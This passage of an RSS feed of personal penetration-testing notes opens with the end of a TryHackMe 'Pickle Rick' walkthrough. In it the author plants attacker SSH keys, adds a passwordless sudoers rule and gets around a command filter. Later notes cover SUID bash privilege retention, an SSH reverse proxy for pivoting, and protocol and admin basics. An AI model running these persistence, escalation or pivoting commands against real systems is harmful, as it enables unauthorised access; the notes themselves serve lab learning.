class=&quot;fu&quot;&gt;sudo&lt;/span&gt; bash -c &lt;span class=&quot;st&quot;&gt;&amp;#39;echo &amp;quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCMLOT6NhiqH5Rp36qJt4jZwfvb/H/+YLRTrx5mS9dSyxumP8+chjxkSNOrdgNtZ6XoaDDDikslQvKMCqoJqHqp4jh9xTQTj29tagUaZmR0gUwatEJPG0SfqNvNExgsTtu2DW3SxCQYwrMtu9S4myr+4x+rwQ739SrPLMdBmughB13uC/3DCsE4aRvWL7p+McehGGkqvyAfhux/9SNgnIKayozWMPhADhpYlAomGnTtd8Cn+O1IlZmvqz5kJDYmnlKppKW2mgtAVeejNXGC7TQRkH6athI5Wzek9PXiFVu6IZsJePo+y8+n2zhOXM2mHx01QyvK2WZuQCvLpWKW92eF amiOpenVPN&amp;quot; &amp;gt; /home/ubuntu/.ssh/authorized_keys&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-2&quot;&gt;&lt;a href=&quot;#cb12-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; bash -c &lt;span class=&quot;st&quot;&gt;&amp;#39;echo &amp;quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDDpkAlZ1jLStW6nS1xFc36hEkuCH20Ef2oJqq/C1kkUBJTyYgxK+0MgGeqfLTbKKWiEOfLyoOK805WbBcgaR1vzB7PIxzV8e1hjzn0yQrDjpfMd3Pf+fvxWaQNrDZ183VeNyOnEL7lbN7xNmCn2nMVkhVGalGDyxKOB8JMusnAD0HdRRtCYPMiBbQjImBtiGkwjo+5soxOteZBrcImcuiJqqSTcEhyxGQo7rf4gBSdLn1uOgwfZeOw1PnuLHAFizUdjOCDYXx0QAMTj9Kx3AmoNisP1p2XsqfFOY8MW+pEloFskMC4XWpZAP84PVFGXhk0L9VkkzRSoFV/5B6fw+T5oeQVv8lHULSRu81iVOvLf9pT+DaOUzQTvbOe/D7djrKYzE2r1AcMmBXhIK34rzAHW2fgUqMfkA6G4LJaPlEXLs2U8kRvzU5tXb+42xmYFFe76j6BumHX+w9AVn4ZqAaiASQm/I6rK9fmlGkkKmykCkAZUEGcICLOVjmk7B0Qk/c= kali@kali&amp;quot; &amp;gt;&amp;gt; /home/ubuntu/.ssh/authorized_keys&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-3&quot;&gt;&lt;a href=&quot;#cb12-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; chown ubuntu.ubuntu /home/ubuntu/.ssh/authorized_keys&lt;/span&gt;
&lt;span id=&quot;cb12-4&quot;&gt;&lt;a href=&quot;#cb12-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; chmod 600 /home/ubuntu/.ssh/authorized_keys&lt;/span&gt;
&lt;span id=&quot;cb12-5&quot;&gt;&lt;a href=&quot;#cb12-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; bash -c &lt;span class=&quot;st&quot;&gt;&amp;#39;echo &amp;quot;ubuntu ALL=(ALL) NOPASSWD: ALL&amp;quot; &amp;gt;&amp;gt; /etc/sudoers&amp;#39;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;(NOTE: The &quot;Command Panel&quot; does a simple string match looking for &quot;cat&quot;, &quot;more&quot;, &quot;tail&quot;, &quot;nano&quot;, &quot;vim&quot;, and &quot;vi&quot;. The last one in particular can be a little problematicâ¦ You may have to run &lt;code&gt;ssh-keygen&lt;/code&gt; a couple of times to get a key without &quot;vi&quot; as a substring.)&lt;/p&gt;&lt;p&gt;We can now access the box directly over SSH as the ubuntu user, and from there elevate to root using sudo.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb13&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb13-1&quot;&gt;&lt;a href=&quot;#cb13-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;ssh&lt;/span&gt; -i ~/id_rsa -F /dev/null &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb13-2&quot;&gt;&lt;a href=&quot;#cb13-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;-o&lt;/span&gt; IdentityAgent=none ubuntu@10.10.158.139&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Though it turns out that I didn't have to go this farâ¦ The third flag is just in the .bash_history file of the ubuntu user.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb14&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb14-1&quot;&gt;&lt;a href=&quot;#cb14-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;ll&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb14-2&quot;&gt;&lt;a href=&quot;#cb14-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; apt-get install apache2&lt;/span&gt;
&lt;span id=&quot;cb14-3&quot;&gt;&lt;a href=&quot;#cb14-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;ls&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb14-4&quot;&gt;&lt;a href=&quot;#cb14-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;ls&lt;/span&gt; -la&lt;/span&gt;
&lt;span id=&quot;cb14-5&quot;&gt;&lt;a href=&quot;#cb14-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;exit&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb14-6&quot;&gt;&lt;a href=&quot;#cb14-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;3rd&lt;/span&gt; ingredients: fleeb juice&lt;/span&gt;
&lt;span id=&quot;cb14-7&quot;&gt;&lt;a href=&quot;#cb14-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;find&lt;/span&gt; / -name php.ini&lt;/span&gt;
&lt;span id=&quot;cb14-8&quot;&gt;&lt;a href=&quot;#cb14-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; find / -name php.ini&lt;/span&gt;
&lt;span id=&quot;cb14-9&quot;&gt;&lt;a href=&quot;#cb14-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; rm -rf /var/lib/php/session/* &lt;/span&gt;
&lt;span id=&quot;cb14-10&quot;&gt;&lt;a href=&quot;#cb14-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;cat&lt;/span&gt; /etc/php/7.0/fpm/php.ini&lt;/span&gt;
&lt;span id=&quot;cb14-11&quot;&gt;&lt;a href=&quot;#cb14-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;cat&lt;/span&gt; /etc/php/7.0/fpm/php.ini &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;grep&lt;/span&gt; session&lt;/span&gt;
&lt;span id=&quot;cb14-12&quot;&gt;&lt;a href=&quot;#cb14-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;cd&lt;/span&gt; /var/lib/php/sessions&lt;/span&gt;
&lt;span id=&quot;cb14-13&quot;&gt;&lt;a href=&quot;#cb14-13&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;ls&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb14-14&quot;&gt;&lt;a href=&quot;#cb14-14&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; ls&lt;/span&gt;
&lt;span id=&quot;cb14-15&quot;&gt;&lt;a href=&quot;#cb14-15&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; rm -rf sess_n16aanckg2ifmk12io64o1kfa2&lt;/span&gt;
&lt;span id=&quot;cb14-16&quot;&gt;&lt;a href=&quot;#cb14-16&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; ls&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;pre&gt;&lt;code&gt;fleeb juice
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Oh well, I still got a root shell (albeit in a totally noisy fashion).&lt;/p&gt;&lt;p&gt;ELAPSED TIME: 3 h 11 min&lt;/p&gt;&lt;h2 id=&quot;references-1&quot;&gt;References&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/picklerick&quot;&gt;TryHackMe: Pickle Rick&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Fri, 14 Apr 2023 03:01:33 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/Pickle%20Rick.md</guid>
		</item>
		<item>
			<title>SAMBA (a.k.a. CIFS) Protocol</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/SAMBA%20%28a.k.a.%20CIFS%29%20Protocol.md</link>
			<description>&lt;h2 id=&quot;default-shares&quot;&gt;Default Shares&lt;/h2&gt;&lt;p&gt;Default SMB shares (which you generally can't connect to):&lt;/p&gt;&lt;ul&gt;&lt;li&gt;IPC$&lt;/li&gt;&lt;li&gt;ADMIN$&lt;/li&gt;&lt;li&gt;C$&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;associated-protocols&quot;&gt;Associated Protocols&lt;/h2&gt;&lt;p&gt;DCERPC is Windows Server's RPC connection protocol.&lt;/p&gt;&lt;p&gt;DRSUAPI is Windows' implementation of the &quot;Directory Replication Service&quot; protocol, which is used to keep domain controllers in sync.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/DCE/RPC&quot;&gt;DCE/RPC (Wikipedia)&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://wiki.samba.org/index.php/DRSUAPI&quot;&gt;DRSUAPI&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;related-video&quot;&gt;Related Video&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=Zma6Mk5bEI8&quot;&gt;Alice with Siddicky (Student Mentor) (YouTube)&lt;/a&gt;&lt;/p&gt;</description>
			<pubDate>Fri, 14 Apr 2023 03:01:33 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/SAMBA%20%28a.k.a.%20CIFS%29%20Protocol.md</guid>
		</item>
		<item>
			<title>SETUID Bash</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/SETUID%20Bash.md</link>
			<description>&lt;p&gt;Let's say you manage to get a copy of bash on a system that's (1) owned by root and (2) has the SUID bit set. If you just try to execute it, bash will still drop privileges, and you'll be running as the same user you were before!&lt;/p&gt;&lt;p&gt;To prevent this, run bash with the &lt;code&gt;-p&lt;/code&gt; flag (&lt;code&gt;./bash -p&lt;/code&gt;), which helpfully instructs bash to &lt;em&gt;not&lt;/em&gt; drop privs.&lt;/p&gt;</description>
			<pubDate>Fri, 14 Apr 2023 03:01:33 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/SETUID%20Bash.md</guid>
		</item>
		<item>
			<title>SIP Protocol</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/SIP%20Protocol.md</link>
			<description>&lt;p&gt;SIP usually uses ports 5060 TCP or UDP for unencrypted signaling or 5061 for encrypted transportation using TLS.&lt;/p&gt;&lt;p&gt;SIP is an ASCII based protocol which has some similar elements like in the HTTP protocol by using a request/response model. Much like an HTTP request from a browser a SIP client request is made using a SIP URI a user agent and a method/request. SIP uses e-mail like addresses format:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;sip:205@192.168.1.100&lt;/li&gt;&lt;li&gt;sip:&lt;a href=&quot;mailto:username@pbx.com&quot;&gt;username@pbx.com&lt;/a&gt;&lt;/li&gt;&lt;li&gt;sip:205@192.168.1.100:5060&lt;/li&gt;&lt;li&gt;etc.&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;sip-requestsmethods&quot;&gt;SIP Requests/Methods&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;INVITE - Used to invite and account to participate in a call session.&lt;/li&gt;&lt;li&gt;ACK - Acknowledge an INVITE request.&lt;/li&gt;&lt;li&gt;CANCEL - Cancel a pending request.&lt;/li&gt;&lt;li&gt;REGISTER - Register user with a SIP server.&lt;/li&gt;&lt;li&gt;OPTIONS - Lists information about the capabilities of a caller.&lt;/li&gt;&lt;li&gt;BYE - Terminates a session between two users in a call.&lt;/li&gt;&lt;li&gt;REFER - Indicates that the recipient(identified by the Request URI) should contact a third party using the contact information provided in the request.&lt;/li&gt;&lt;li&gt;SUBSCRIBE - The SUBSCRIBE method is used to request current state and state updates from a remote node.&lt;/li&gt;&lt;li&gt;NOTIFY - The NOTIFY method is used to notify a SIP node that an event which has been requested by an earlier SUBSCRIBE method has occurred.&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;example-sip-invite-request&quot;&gt;Example SIP INVITE Request&lt;/h3&gt;&lt;pre class=&quot;sip&quot;&gt;&lt;code&gt;INVITE sip:201@192.168.1.104 SIP/2.0
Via: SIP/2.0/UDP 192.168.1.102;rport;branch=z9hG4bKvbxaoqar
Max-Forwards: 70 

To: 
From: &amp;quot;NightRanger&amp;quot; ;tag=eihgg
Call-ID: hfxsabthoymshub@backtrack
CSeq: 649 INVITE
Contact: 
Content-Type: application/sdp 

Allow: INVITE,ACK,BYE,CANCEL,OPTIONS,PRACK,REFER,NOTIFY,SUBSCRIBE,INFO,MESSAGE
Supported: replaces,norefersub,100rel
User-Agent: Twinkle/1.2 

Content-Length: 310
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;sip-responses&quot;&gt;SIP Responses&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;1xx - Informational responses.&lt;/li&gt;&lt;li&gt;2xx - Successful responses: The action was successfully received, understood, and accepted.&lt;/li&gt;&lt;li&gt;3xx - Redirection responses.&lt;/li&gt;&lt;li&gt;4xx - Request failure responses: The request contains bad syntax or cannot be fulfilled at the server.&lt;/li&gt;&lt;li&gt;5xx - Server failure responses: The server failed to fulfill an apparently valid request.&lt;/li&gt;&lt;li&gt;6xx - Global failure responses: The request cannot be fulfilled at any server.&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;example-sip-call&quot;&gt;Example SIP Call&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;The calling phone sends an invite.&lt;/li&gt;&lt;li&gt;The called phone sends back a response of 100 (Trying).&lt;/li&gt;&lt;li&gt;The called phone then starts to ring and sends a response of 180 (Ringing).&lt;/li&gt;&lt;li&gt;When the caller picks up the phone the called phone sends a response of 200 (OK).&lt;/li&gt;&lt;li&gt;The calling phone sends an ACK response.&lt;/li&gt;&lt;li&gt;Conversation begins via RTP.&lt;/li&gt;&lt;li&gt;When the caller hangs up the phone a BYE request is sent.&lt;/li&gt;&lt;li&gt;The calling phone responds with 200 (OK).&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/slyth11907/Cheatsheets&quot;&gt;slyth11907 / Cheatsheets&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Fri, 14 Apr 2023 03:01:33 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/SIP%20Protocol.md</guid>
		</item>
		<item>
			<title>Simple Mail Transfer Protocol (SMTP)</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Simple%20Mail%20Transfer%20Protocol%20%28SMTP%29.md</link>
			<description>&lt;p&gt;A set of commands to send an email:&lt;/p&gt;&lt;pre class=&quot;smtp&quot;&gt;&lt;code&gt;HELO somehostname
MAIL FROM:fromaddress@host1.tld
RCPT TO:toaddress@host2.tld
DATA
To: &amp;quot;To Address&amp;quot; &amp;lt;toaddress@host2.tld&amp;gt;
From: &amp;quot;From Address&amp;quot; &amp;lt;fromaddress@host1.tld&amp;gt;
Subject: An Email
This is content.

Here is another line.
.
QUIT
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Note that &lt;code&gt;MAIL FROM&lt;/code&gt; / &lt;code&gt;From&lt;/code&gt; and &lt;code&gt;RCPT TO&lt;/code&gt; / &lt;code&gt;To&lt;/code&gt; are not actually required to match, though failure to fill in the &lt;code&gt;MAIL FROM&lt;/code&gt; / &lt;code&gt;RCPT TO&lt;/code&gt; commands &lt;em&gt;may&lt;/em&gt; result in the message being rejected. The commands above are &lt;em&gt;not&lt;/em&gt; case-sensitive, and the message ends with a &lt;code&gt;.&lt;/code&gt; on a single line.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/path/outline/jrpenetrationtester&quot;&gt;TryHackMe: Jr. Penetration Tester&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://stackoverflow.com/questions/10822190/in-smtp-must-the-rcpt-to-and-to-match&quot;&gt;In SMTP, must the RCPT TO: and TO: match?&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Fri, 14 Apr 2023 03:01:33 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Simple%20Mail%20Transfer%20Protocol%20%28SMTP%29.md</guid>
		</item>
		<item>
			<title>UNIX File Descriptors</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/UNIX%20File%20Descriptors.md</link>
			<description>&lt;h2 id=&quot;standard-file-discriptors&quot;&gt;Standard File Discriptors&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;STDIN - 0&lt;/li&gt;&lt;li&gt;STDOUT - 1&lt;/li&gt;&lt;li&gt;STDERR - 2&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;other-file-descriptors&quot;&gt;Other File Descriptors&lt;/h2&gt;&lt;p&gt;You can also create your own file descriptors in an ad hoc fashion.&lt;/p&gt;&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.tutorialspoint.com/unix/unix-io-redirections.htm&quot;&gt;Unix / Linux - Shell Input/Output Redirections&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Fri, 14 Apr 2023 03:01:33 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/UNIX%20File%20Descriptors.md</guid>
		</item>
		<item>
			<title>Uniform Resource Locators (URLs)</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Uniform%20Resource%20Locators%20%28URLs%29.md</link>
			<description>&lt;p&gt;scheme://user:password@domain:port/some/path?a=query#fragment&lt;/p&gt;&lt;p&gt;â¦ or, in the &quot;real world&quot; â¦&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://foo:bar@example.tld:8080/this/is/a/path?id=1&amp;amp;task=2#in_page_reference&quot;&gt;http://foo:bar@example.tld:8080/this/is/a/path?id=1&amp;amp;task=2#in_page_reference&lt;/a&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/path/outline/presecurity&quot;&gt;TryHackMe: Pre Security&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Fri, 14 Apr 2023 03:01:33 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Uniform%20Resource%20Locators%20%28URLs%29.md</guid>
		</item>
		<item>
			<title>Upgrading PostgreSQL</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Upgrading%20PostgreSQL.md</link>
			<description>&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; -u postgres pg_dropcluster --stop &lt;span class=&quot;va&quot;&gt;$NEW_VER&lt;/span&gt; main&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; -u postgres pg_upgradecluster &lt;span class=&quot;va&quot;&gt;$OLD_VER&lt;/span&gt; main&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; -u postgres pg_dropcluster --stop &lt;span class=&quot;va&quot;&gt;$OLD_VER&lt;/span&gt; main&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Where &lt;code&gt;$OLD_VER&lt;/code&gt; and &lt;code&gt;$NEW_VER&lt;/code&gt; are the old and new major version numbers (e.g., 13 and 14).&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.netvizura.com/blog/how-to-upgrade-postgresql-from-13-to-14&quot;&gt;How to upgrade PostgreSQL from 13 to 14&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Fri, 14 Apr 2023 03:01:33 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Upgrading%20PostgreSQL.md</guid>
		</item>
		<item>
			<title>Use OpenSSL to Encrypt and Decrypt Files</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Use%20OpenSSL%20to%20Encrypt%20and%20Decrypt%20Files.md</link>
			<description>&lt;p&gt;To encrypt a file:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;openssl&lt;/span&gt; rsa -in &lt;span class=&quot;va&quot;&gt;$FILE&lt;/span&gt; -aes256 -out &lt;span class=&quot;va&quot;&gt;$CRYPTOFILE&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To decrypt a file:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;openssl&lt;/span&gt; rsa -in &lt;span class=&quot;va&quot;&gt;$CRYPTOFILE&lt;/span&gt; -out &lt;span class=&quot;va&quot;&gt;$FILE&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
			<pubDate>Fri, 14 Apr 2023 03:01:33 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Use%20OpenSSL%20to%20Encrypt%20and%20Decrypt%20Files.md</guid>
		</item>
		<item>
			<title>Use SSH as a Proxy</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Use%20SSH%20as%20a%20Proxy.md</link>
			<description>&lt;p&gt;You can use SSH as a SOCKS5 proxy (with a tool like proxychains) using remote port forwarding.&lt;/p&gt;&lt;p&gt;You need to already have access to a $TARGET machine. SSH from the $TARGET back to the $ATTACKER box:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;ssh&lt;/span&gt; -R &lt;span class=&quot;va&quot;&gt;$PORT&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$USER&lt;/span&gt;@&lt;span class=&quot;va&quot;&gt;$ATTACKER&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This will open up $PORT on $ATTACKER, which can then be used as a SOCKS5 proxy by applications on $ATTACKER. Useful for gaining access to machines on an internal network that may be visible to $TARGET but not $ATTACKER.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.offensive-security.com/offsec/offsec-live/&quot;&gt;OffSec Live&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Fri, 14 Apr 2023 03:01:33 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Use%20SSH%20as%20a%20Proxy.md</guid>
		</item>
		<item>
			<title>Use an Alternate SSH Key with Git</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Use%20an%20Alternate%20SSH%20Key%20with%20Git.md</link>
			<description>&lt;p&gt;By default, Git only uses you primary SSH key when cloning. While there's no way to get git to try alternate keys if the first key fails, there are a few ways you can force it to use a particular key on a per-repository basis.&lt;/p&gt;&lt;p&gt;Note that in the below examples $KEY_FILE must be the full path of a private key (e.g., ~/.ssh/id_rsa or ~/.ssh/gpg_auth_key.pub). If you're running ssh-agent (or a work-alike) and using a key generated by ssh-keygen, then setting the config directive &lt;code&gt;IdentityAgent=none&lt;/code&gt; is important in the second two methods as otherwise the key(s) already stored in the agent will take precedence over $KEY_FILE. However, when using a GPG authentication subkey via gpg-agent with SSH (in which case you'll be referencing the public part of that key, rather than a SSH secret key) this directive should &lt;em&gt;not&lt;/em&gt; be included (gpg-agent will do the right thing).&lt;/p&gt;&lt;h2 id=&quot;via-ssh-agent&quot;&gt;Via ssh-agent&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;ssh-agent&lt;/span&gt; bash -c &lt;span class=&quot;st&quot;&gt;&amp;quot;ssh-add &lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$KEY_FILE&lt;/span&gt;&lt;span class=&quot;st&quot;&gt; &amp;amp;&amp;amp; git &lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$COMMAND&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This is useful for running multiple, one-off commands. Note that this method won't work when used with GPG authentication subkeys.&lt;/p&gt;&lt;h2 id=&quot;via-git_ssh_command&quot;&gt;Via GIT_SSH_COMMAND&lt;/h2&gt;&lt;p&gt;With a secret SSH key:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;GIT_SSH_COMMAND=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;ssh -i &lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$KEY_FILE&lt;/span&gt;&lt;span class=&quot;st&quot;&gt; -F /dev/null -o IdentityAgent=none&amp;quot;&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;git&lt;/span&gt; &lt;span 